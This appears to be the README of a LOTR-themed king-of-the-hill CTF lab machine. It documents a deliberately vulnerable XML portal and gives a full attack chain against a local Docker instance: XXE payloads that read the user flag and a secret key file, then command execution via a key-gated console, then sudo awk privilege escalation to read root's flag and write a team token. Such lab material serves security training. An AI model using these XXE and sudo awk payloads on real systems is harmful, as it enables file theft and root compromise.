# Hill 6 - The Palantir of Orthanc (XXE -> command console -> sudo awk)

*Theme: LOTR / Isengard.* A "seeing stone" comms portal that parses XML visions and
resolves external entities by hand - a classic **XXE** with pure stdlib.

- **Entry:** `POST /scry` with an XML `<!ENTITY ... SYSTEM "file://...">` reads arbitrary
  files. Use it to read `user.txt` and to leak `/opt/app/palantir.key`; that key unlocks
  `GET /command?key=...&cmd=...` -> shell. Foothold: `palantir`. Port 80 (8086 locally).
- **Privesc:** `sudo /usr/bin/awk` (GTFOBins):
  `sudo awk 'BEGIN{system("cat /root/root.txt")}' /dev/null`. Restored on reset.
- **Flags:** `user.txt` (foothold) and `/root/root.txt` (root).

## Attack chain

    # 1. XXE: read the user flag
    curl -s -X POST http://127.0.0.1:8086/scry --data-binary \
      '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///home/palantir/user.txt">]><vision>&x;</vision>'

    # 2. XXE: leak the attunement key
    KEY=$(curl -s -X POST http://127.0.0.1:8086/scry --data-binary \
      '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///opt/app/palantir.key">]><vision>&x;</vision>')

    # 3. command console -> shell -> privesc -> root flag
    curl -s -G http://127.0.0.1:8086/command --data-urlencode "key=$KEY" \
      --data-urlencode "cmd=sudo awk 'BEGIN{system(\"cat /root/root.txt\")}' /dev/null"

    # 4. take the hill: write your token to /root/king.txt (via sudo awk)
    curl -s -G http://127.0.0.1:8086/command --data-urlencode "key=$KEY" \
      --data-urlencode "cmd=sudo awk 'BEGIN{system(\"echo TOK-YOUR-TEAM > /root/king.txt\")}' /dev/null"

## Run locally

    docker compose up -d --build   # app: http://localhost:8086/
